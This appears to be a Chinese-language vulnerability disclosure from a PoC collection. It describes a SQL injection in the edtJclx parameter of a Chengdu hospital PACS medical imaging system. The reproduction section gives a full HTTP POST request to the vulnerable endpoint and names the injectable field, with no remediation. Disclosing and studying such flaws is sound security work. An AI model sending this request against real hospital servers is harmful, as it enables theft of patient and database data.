# 成都信通网易医疗科技发展有限公司PACS(医学影像信息管理系统)edtJclx存在SQL注入漏洞

# 一、漏洞简介
成都信通网易医疗科技发展有限公司总部位于四川成都高新区天府软件园，在国内医疗软件行业中率先采用Java技术，融入国际国内标准，整体设计，持续研发，先后形成了“智慧云医院信息平台”、“医共体信息平台”、“互联网医院平台”、“医养融合信息平台”等新一代一系列自主知识产权产品，全面覆盖了单体医院业务、区域医疗、医共体、“互联网+健康”等信息化建设领域。成都信通网易医疗科技发展有限公司PACS(医学影像信息管理系统)edtJclx存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 成都信通网易医疗科技发展有限公司PACS(医学影像信息管理系统)

# 三、特征
![1700650941861-e1d2149c-0043-4e5b-8d5a-a051c63982a6.png](./img/YR1LQosHaWEWoTsy/1700650941861-e1d2149c-0043-4e5b-8d5a-a051c63982a6-934372.png)

# 四、漏洞复现
```plain
POST /JcbgForYsz/Show_Jcbg_Ysz.asp HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 162
Connection: close
Cookie: ASPSESSIONIDCSBBQDTQ=KAJHGCOCOODELKOELMFGEMMK
Upgrade-Insecure-Requests: 1

edtJclx=%A3%C2%D0%CD%B3%AC%C9%F9&edtQsrq=2023-10-17&edtJsrq=2023-10-17&edtBgzt=%D2%D1%D4%A4%D4%BC&edtZwxm=&edtSjks=%B1%BE%D4%BA%CC%E5%BC%EC&edtSubmit=%B2%E9%D1%AF
```

![1700651676241-d3392ad1-f0ea-486a-a6fa-50b796736354.png](./img/YR1LQosHaWEWoTsy/1700651676241-d3392ad1-f0ea-486a-a6fa-50b796736354-334387.png)





> 更新: 2024-02-29 23:55:28  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cggv50rtx7k19pah>